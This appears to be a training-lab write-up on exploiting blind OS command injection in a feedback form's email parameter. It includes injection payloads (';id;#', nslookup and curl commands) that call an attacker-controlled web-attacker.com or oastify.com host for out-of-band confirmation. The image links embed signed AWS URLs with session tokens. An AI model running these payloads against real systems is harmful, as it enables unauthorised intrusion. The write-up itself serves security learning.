# Blind OS command injection with out-of-band interaction

### Goal - 

Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

### Analysis/Exploitation 

First have a look at the website and its feedback feature. I submit a feedback and send the request to repeater. In the previous lab, we found that the `email` parameter is vulnerable to blind OS command injection:
I assume that the attack vector is the same as in the other labs: the email input field.

try to do **OS command injection** in the `email` parameter:

`;id;#`

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/3cf01424-4157-4060-9e62-40874da27ca0/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SFKWLMGA%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210431Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID4Ol6PvVkxho5yrR28AqaGJ3NLwWNAjJIPOopQPJEtNAiAZH%2FTkjxpzUDdlOIBia1mjwk0V1QppxEl1MxZiM6yHNyqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMlkmY060NUbH%2FmsAKKtwDBK7yoPfXa7BavYOC0Aidz%2BPPP4Q8kR%2Bgf%2F8T%2FzulrXQ5gu20guVCvAuLgZTgvgK2t9UeEpwrdhN7VgTRMkafrR7i25LAGV2DLXYEQs70lX4CvtF5LaWuPG0PNFh%2Fji8EMuYcttfe5bw%2B%2BkJwxk5yBJclN1Y2OpTxT1lbKCOTIWe1O2vHlayi%2BH4zWmhtxPUedMM2QoKGbvE%2FPtGBGzqhevPvEaRn%2FgBAmECXV4VevgPIB4BpFTr%2B%2BTGK2nBCIS%2F8CghqWm266RkZV1%2FxY29CJ9y52yepLm35pVWTqz6vfRMpKKIB7ftJxFH%2FkClrgplrQqkOoj%2BETEUWitnvlbP29tHnPDlSxJ6Vo2bApHoUbcpWTIyr%2FxSuDLfDn7GxIwK9fEOuzOKIPlPMsfzxfW0KJLr9s%2FPN5PCGX6vE4uoeLO7pF9xMVP5pWI8Wq0I0D2djLU4RfpzA8JqeIptvCC%2BdBwwwoNil6hqI4ujk5S8t57nlSg0kpfQUKjHFEopNRpbnVRSqS%2FaXNxO5SvATNKZfHThOe9Ebmck8br%2F35vZtdRWkvcX8WoSCod6YfNsPuiXwoFtSsqQ56Eg0KnR%2FqqbZqgZedAk1VdGp9Yv8Vb4ayz94LpLusxxg0PXRhnEwiMai1AY6pgFt6msCo7YU%2B4RUObsv74ZlbHcbvhwAUJEEZcUZiAqFUN0dffZ0LfzbHViaZ3RH2tOxNIiB7yunYLxNzDFk5FCmroF9111wR4tq6ITV9Yhqg%2FXghpkQlo08TkETSVq1%2BEIZf7eZEoFFxtcGN5hBoYq0rskLmoNAlVxSukSjn5CLnmgEdVnVnQ9K6LzYuAOO4%2Fje1hpFxZo%2BMVt3sXk7rD0NH3oyRfwW&X-Amz-Signature=31209db276d02c9ba91f539852535dff8810cb706720f9c9945df9310ef67a18&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

However, there’s no output of our command in the response, it might be vulnerable to blind OS command injection.

> 💡 We can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:

```bash
& nslookup kgji2ohoyw.web-attacker.com &

```

This payload uses the `nslookup` command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.

Therefore I open a new Burp Collaborator client and generate a new payload. URLencode the payload to avoid breaking the request.

```bash
;nslookup bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;#
```

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/60ea66f9-854a-4130-b9fd-6b6833371b79/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SFKWLMGA%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210431Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID4Ol6PvVkxho5yrR28AqaGJ3NLwWNAjJIPOopQPJEtNAiAZH%2FTkjxpzUDdlOIBia1mjwk0V1QppxEl1MxZiM6yHNyqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMlkmY060NUbH%2FmsAKKtwDBK7yoPfXa7BavYOC0Aidz%2BPPP4Q8kR%2Bgf%2F8T%2FzulrXQ5gu20guVCvAuLgZTgvgK2t9UeEpwrdhN7VgTRMkafrR7i25LAGV2DLXYEQs70lX4CvtF5LaWuPG0PNFh%2Fji8EMuYcttfe5bw%2B%2BkJwxk5yBJclN1Y2OpTxT1lbKCOTIWe1O2vHlayi%2BH4zWmhtxPUedMM2QoKGbvE%2FPtGBGzqhevPvEaRn%2FgBAmECXV4VevgPIB4BpFTr%2B%2BTGK2nBCIS%2F8CghqWm266RkZV1%2FxY29CJ9y52yepLm35pVWTqz6vfRMpKKIB7ftJxFH%2FkClrgplrQqkOoj%2BETEUWitnvlbP29tHnPDlSxJ6Vo2bApHoUbcpWTIyr%2FxSuDLfDn7GxIwK9fEOuzOKIPlPMsfzxfW0KJLr9s%2FPN5PCGX6vE4uoeLO7pF9xMVP5pWI8Wq0I0D2djLU4RfpzA8JqeIptvCC%2BdBwwwoNil6hqI4ujk5S8t57nlSg0kpfQUKjHFEopNRpbnVRSqS%2FaXNxO5SvATNKZfHThOe9Ebmck8br%2F35vZtdRWkvcX8WoSCod6YfNsPuiXwoFtSsqQ56Eg0KnR%2FqqbZqgZedAk1VdGp9Yv8Vb4ayz94LpLusxxg0PXRhnEwiMai1AY6pgFt6msCo7YU%2B4RUObsv74ZlbHcbvhwAUJEEZcUZiAqFUN0dffZ0LfzbHViaZ3RH2tOxNIiB7yunYLxNzDFk5FCmroF9111wR4tq6ITV9Yhqg%2FXghpkQlo08TkETSVq1%2BEIZf7eZEoFFxtcGN5hBoYq0rskLmoNAlVxSukSjn5CLnmgEdVnVnQ9K6LzYuAOO4%2Fje1hpFxZo%2BMVt3sXk7rD0NH3oyRfwW&X-Amz-Signature=7f995a9ebd3d8890e0846ca5bba46413a95c221a8bc2c2fbb7525a833868e5bd&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

we successfully received 2 DNS lookups, which means the feedback function is indeed vulnerable to blind OS command injection!!

**Besides from **`nslookup`**, we can also use **`curl`**:**

`;curl bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;# `

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/b2aeba79-db56-4c12-b5d6-e1ce387d4f27/b558b3bb-6a70-4cd6-8fe6-c1745e856deb/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB466SFKWLMGA%2F20260821%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260821T210431Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEOP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCID4Ol6PvVkxho5yrR28AqaGJ3NLwWNAjJIPOopQPJEtNAiAZH%2FTkjxpzUDdlOIBia1mjwk0V1QppxEl1MxZiM6yHNyqIBAis%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIMlkmY060NUbH%2FmsAKKtwDBK7yoPfXa7BavYOC0Aidz%2BPPP4Q8kR%2Bgf%2F8T%2FzulrXQ5gu20guVCvAuLgZTgvgK2t9UeEpwrdhN7VgTRMkafrR7i25LAGV2DLXYEQs70lX4CvtF5LaWuPG0PNFh%2Fji8EMuYcttfe5bw%2B%2BkJwxk5yBJclN1Y2OpTxT1lbKCOTIWe1O2vHlayi%2BH4zWmhtxPUedMM2QoKGbvE%2FPtGBGzqhevPvEaRn%2FgBAmECXV4VevgPIB4BpFTr%2B%2BTGK2nBCIS%2F8CghqWm266RkZV1%2FxY29CJ9y52yepLm35pVWTqz6vfRMpKKIB7ftJxFH%2FkClrgplrQqkOoj%2BETEUWitnvlbP29tHnPDlSxJ6Vo2bApHoUbcpWTIyr%2FxSuDLfDn7GxIwK9fEOuzOKIPlPMsfzxfW0KJLr9s%2FPN5PCGX6vE4uoeLO7pF9xMVP5pWI8Wq0I0D2djLU4RfpzA8JqeIptvCC%2BdBwwwoNil6hqI4ujk5S8t57nlSg0kpfQUKjHFEopNRpbnVRSqS%2FaXNxO5SvATNKZfHThOe9Ebmck8br%2F35vZtdRWkvcX8WoSCod6YfNsPuiXwoFtSsqQ56Eg0KnR%2FqqbZqgZedAk1VdGp9Yv8Vb4ayz94LpLusxxg0PXRhnEwiMai1AY6pgFt6msCo7YU%2B4RUObsv74ZlbHcbvhwAUJEEZcUZiAqFUN0dffZ0LfzbHViaZ3RH2tOxNIiB7yunYLxNzDFk5FCmroF9111wR4tq6ITV9Yhqg%2FXghpkQlo08TkETSVq1%2BEIZf7eZEoFFxtcGN5hBoYq0rskLmoNAlVxSukSjn5CLnmgEdVnVnQ9K6LzYuAOO4%2Fje1hpFxZo%2BMVt3sXk7rD0NH3oyRfwW&X-Amz-Signature=58d1a436695c1b3a424a5c26720080b16bd9fb488bff00dd60c7c647f1d61ca3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
